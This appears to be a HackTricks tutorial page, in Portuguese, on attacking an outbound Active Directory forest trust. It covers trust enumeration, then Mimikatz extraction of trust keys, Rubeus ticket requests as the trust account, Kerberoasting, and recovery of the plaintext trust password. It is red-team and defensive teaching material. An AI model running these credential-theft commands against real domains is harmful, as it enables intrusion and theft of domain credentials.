# Domínio Florestal Externo - Apenas de Saída (Outbound)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

## Enumeração

### Confiança de Saída
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Ataque à Conta de Confiança

Existe uma vulnerabilidade de segurança quando é estabelecida uma relação de confiança entre dois domínios, identificados aqui como domínio **A** e domínio **B**, onde o domínio **B** estende sua confiança ao domínio **A**. Nessa configuração, uma conta especial é criada no domínio **A** para o domínio **B**, que desempenha um papel crucial no processo de autenticação entre os dois domínios. Essa conta, associada ao domínio **B**, é utilizada para criptografar tickets para acessar serviços entre os domínios.

O aspecto crítico a ser compreendido aqui é que a senha e o hash dessa conta especial podem ser extraídos de um Controlador de Domínio no domínio **A** usando uma ferramenta de linha de comando. O comando para realizar essa ação é:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Esta extração é possível porque a conta, identificada com um **$** após o seu nome, está ativa e pertence ao grupo "Domain Users" do domínio **A**, herdando assim permissões associadas a este grupo. Isso permite que indivíduos se autentiquem contra o domínio **A** usando as credenciais desta conta.

**Aviso:** É viável aproveitar esta situação para obter uma posição de apoio no domínio **A** como usuário, embora com permissões limitadas. No entanto, este acesso é suficiente para realizar enumeração no domínio **A**.

Em um cenário onde `ext.local` é o domínio confiante e `root.local` é o domínio confiável, uma conta de usuário chamada `EXT$` seria criada dentro de `root.local`. Através de ferramentas específicas, é possível extrair as chaves de confiança do Kerberos, revelando as credenciais de `EXT$` em `root.local`. O comando para realizar isso é:
```bash
lsadump::trust /patch
```
Seguindo este procedimento, poderia-se usar a chave RC4 extraída para autenticar como `root.local\EXT$` dentro de `root.local` usando outro comando da ferramenta:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Este passo de autenticação abre a possibilidade de enumerar e até mesmo explorar serviços dentro de `root.local`, como realizar um ataque Kerberoast para extrair credenciais de conta de serviço usando:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Obtenção da senha de confiança em texto simples

No fluxo anterior, foi usado o hash de confiança em vez da **senha em texto claro** (que também foi **capturada pelo mimikatz**).

A senha em texto claro pode ser obtida convertendo a saída \[ CLEAR ] do mimikatz de hexadecimal e removendo os bytes nulos '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Às vezes, ao criar um relacionamento de confiança, uma senha deve ser digitada pelo usuário para a confiança. Nesta demonstração, a chave é a senha de confiança original e, portanto, legível para humanos. Conforme a chave é alterada (a cada 30 dias), o texto simples não será legível para humanos, mas tecnicamente ainda utilizável.

A senha em texto claro pode ser usada para realizar autenticação regular como a conta de confiança, uma alternativa para solicitar um TGT usando a chave secreta do Kerberos da conta de confiança. Aqui, consultando root.local de ext.local para membros de Administradores de Domínio:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referências

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Aprenda hacking AWS do zero ao avançado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
